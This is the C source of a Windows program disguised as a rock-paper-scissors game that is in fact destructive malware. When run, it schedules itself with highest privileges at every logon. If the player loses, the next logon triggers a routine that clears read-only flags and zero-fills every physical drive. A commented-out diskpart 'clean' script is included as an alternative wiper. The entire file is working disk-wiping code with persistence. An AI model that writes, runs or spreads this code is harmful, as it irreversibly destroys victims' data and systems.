#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <winioctl.h>

// schedules self on logon with highest priviliges 
void task_sch() {
    char exepath[MAX_PATH]; //finding current executable
    char cmd[MAX_PATH + 256]; // buffer for the rest of the code

    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
        return;
    }
    sprintf(cmd, 
        "schtasks /create /sc onlogon /tn \"game\" /tr \"%s payload\" /rl highest /f", 
        exepath);
    system(cmd);
    
}
// random numer 1-10 guessing game
void game() {
    SetConsoleTitleA("Screen");

    printf("=== Let's Play a little Game ===\n");
    printf("If you want your computer back...\n");
    printf("I wouldn't exit this program if I were you");

    srand(time(NULL));
	const char *dict[] = {"", "rock", "paper", "scissors"};
	int robot = rand() % 3 + 1;
	int play;
	printf("rock(1), paper(2), scissors(3) >:");
	scanf("%d", &play);
	int rps = play - robot;
	printf("robot chose %s\n", dict[robot]);
	if (rps > 0 && rps != -2) {
		printf("you won!\n");
        safe();
	} else if (rps == -2) {printf("you won!\n");
        safe();
	} else if (rps == -1) {printf("you lost :(\n");
	} else if (rps == 0) {printf("tie, you lost :(\n"); }
}
// so if you win your system isnt destroyed
void safe() {
    system("schtasks /delete /tn \"game\" /f");
}

//1. list all disks -> ld.txt
//2. parce disk nums > lo.txt
//3. clear all attriebutes so i can touch read-only files > cl.txt
//4. exec diskpart with cmnds
//5. rm temp files

void payload() {
    /*system(
        "cmd /c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
        "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
        "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
        "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt"
    );*/
    
    // only accepts 32 disks
    for (int disknum = 0; disknum < 32; disknum++) {
        char disk_path[64];
        sprintf(disk_path, "\\\\.\\PhysicalDrive%d", disknum);

        // open disk for direct write, bypass cache
        HANDLE hDisk = CreateFileA(
            disk_path,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, 
            OPEN_EXISTING,
            FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, //more like diskpart clean all
            0, NULL
        );
        if (hDisk == INVALID_HANDLE_VALUE) continue;

        // clear read only flags
        DISK_ATTRIBUTES attrs = {0};
        DWORD bytesReturned;

        DeviceIoControl(
            hDisk,
            IOCTL_DISK_GET_DISK_ATTRIBUTES,
            NULL, 0,
            &attrs, sizeof(attrs),
            &bytesReturned,
            NULL
        );

        //clear read only flag
        attrs.ReadOnly = 0;

        //write updated attributes
        DeviceIoControl(
            hDisk,
            IOCTL_DISK_SET_DISK_ATTRIBUTES,
            &attrs, sizeof(attrs),
            NULL, 0,
            &bytesReturned,
            NULL
        );

        // find disk size
        LARGE_INTEGER disk_size;
        DeviceIoControl(
            hDisk,
            IOCTL_DISK_GET_LENGTH_INFO,
            NULL, 0, 
            &disk_size, sizeof(disk_size),
            &bytesReturned,
            NULL
        );
        // large buffer for faster writes, not as fast as powershell :(
        const size_t bufSize = 16 * 1024 * 1024; // has to be divisble by 512
        char* buffer = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) { CloseHandle(hDisk); return; }
        ZeroMemory(buffer, bufSize);

        LARGE_INTEGER offset;
        offset.QuadPart = 0;
        DWORD written;

        while (offset.QuadPart < disk_size.QuadPart) {
            SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
            WriteFile(hDisk, buffer, (DWORD)((disk_size.QuadPart - offset.QuadPart > bufSize) ? bufSize : disk_size.QuadPart - offset.QuadPart), &written, NULL);
            offset.QuadPart += written;
        }

        // so theres no memory leaks
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hDisk);
    }
}
int main(int argc, char *argv[]){
    // so that on logon, the script only runs the payload
    // i added flagging in the first place because i want the user to
    //enter uac once at the start instead of after they lose
    if (argc > 1 && strcmp(argv[1], "payload") == 0) {
        payload();
        return 0;
    }
    task_sch();
    game();
}